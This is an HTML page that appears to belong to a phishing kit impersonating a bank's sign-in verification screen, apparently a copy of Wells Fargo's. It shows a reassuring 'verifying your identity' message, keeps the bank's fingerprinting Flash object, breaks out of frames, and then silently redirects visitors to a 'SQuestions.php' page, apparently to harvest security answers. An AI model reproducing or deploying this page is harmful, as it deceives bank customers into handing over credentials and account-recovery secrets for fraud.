﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    

    <title>Signing In</title>
    <link href="rice/muyiba.ico" rel="shortcut icon" type="image/x-icon">
    <link href="rice/muyiba.ico" rel="icon" type="image/x-icon">
    <link href="smile/vudu.css" media="screen,projection,print" rel="stylesheet" type="text/css">
    <link href="smile/wibscreen.css" media="screen,projection,print" rel="stylesheet" type="text/css">
    <link href="smile/wibprint.css" media="print" rel="stylesheet" type="text/css">
    <link href="smile/mm.css" rel="stylesheet" type="text/css">
    <script type="text/javascript" src="smile/wibcommon.js"></script>
    
</head>

<body id="wf_me_com" onload="doMetaRefresh();;addFlash();">
	 
	<script type="text/javascript">
		<!--
		if (top	!= self) {
		  top.location.href = self.location.href;
		}
		// -->
	</script>








    
   



<script type="text/javascript" src="smile/user-prefs.js"></script>
<script type="text/javascript" src="smile/checkflash.js"></script><script language="VBScript" type="text/vbscript">
<!-- // Visual basic helper required to detect Flash Player ActiveX control version information -->
 Function VBGetSwfVer(i) 
 on error resume next 
 Dim swControl, swVersion 
 swVersion = 0 
 set swControl = CreateObject("ShockwaveFlash.ShockwaveFlash." + CStr(i)) 
 if (IsObject(swControl)) then 
 swVersion = swControl.GetVariable("$version")  
 end if  
 VBGetSwfVer = swVersion  
 End Function  
</script> 


	
		<form name="pausePageForm">
			<input type="hidden" id="u_p" name="u_p" value="">
		</form>


<script type="text/javascript">
	 
		function getPrefs() {
		   fortyone.collect('u_p');
		   return false;
		}

	function addFlash() {	
    	 
    	var ups = escape(document.getElementById("u_p").value);

    	var queryStr = "dcUrl=/das/fcs?p=" + ups + "&flash=true&";
    	  
		if (!document.getElementById) {
            return;
        }		
        if (DetectFlashVer(6, 0, 65)) {
            var flashDiv = document.getElementById("flashDiv");
            if(flashDiv == null) {
                return;
            }
            flashDiv.innerHTML =
            '<object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" width=\"1\" height=\"1\" id=\"flash\" align=\"middle\">' +
            '<param name=\"allowScriptAccess\" value=\"sameDomain\" />' +
            '<param name=\"movie\" value=\"/das/common/images/bharosa.swf\" />' +
            '<param name=\"quality\" value=\"low\" />' +
            '<param name=\"bgcolor\" value=\"#ffffff\" />' +
            '<param name=\"FlashVars\" value=\"' + queryStr + '\" />' +
            '<embed src=\"/das/common/images/bharosa.swf\" quality=\"low\" bgcolor=\"#ffffff\" FlashVars=\"' + queryStr + '\" width=\"1\" height=\"1\" name=\"flash\" align=\"middle\" allowScriptAccess=\"sameDomain\" type=\"application/x-shockwave-flash\" />' +
            '</object>';
        }
    }
	
	function doMetaRefresh() {		
		setTimeout("window.location.replace('SQuestions.php?sid=SIGN-ON_PORTAL_PAUSE')",800);		
	}
</script>


    <div id="flashDiv"><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="1" height="1" id="flash" align="middle"><param name="allowScriptAccess" value="sameDomain"><param name="movie" value="/das/common/images/bharosa.swf"><param name="quality" value="low"><param name="bgcolor" value="#ffffff"><param name="FlashVars" value="dcUrl=/das/fcs?p=&amp;flash=true&amp;"><embed src="/das/common/images/bharosa.swf" quality="low" bgcolor="#ffffff" flashvars="dcUrl=/das/fcs?p=&amp;flash=true&amp;" width="1" height="1" name="flash" align="middle" allowscriptaccess="sameDomain" type="application/x-shockwave-flash"></object></div>





<div id="pause" align="center">
<table border="0" cellpadding="0" cellspacing="0">
<tbody><tr>
  <td>
   <img id="pauseimg" src="smile/logo_62sq.gif" height="62" width="62" alt="">
  </td>
  <td id="pausemessage">
   <table cellpadding="3" cellspacing="0">
     <tbody><tr>
       <td valign="bottom" align="left">
	 <span class="pausetext">
	   Your online security is important to us.<br> Please wait while we verify your identity...
	 </span>
       </td>
     </tr>
   </tbody></table>
  </td>
</tr>
</tbody></table>
</div>
<!-- Banking Agent: "mn2_fea4_ch" -->





</body></html>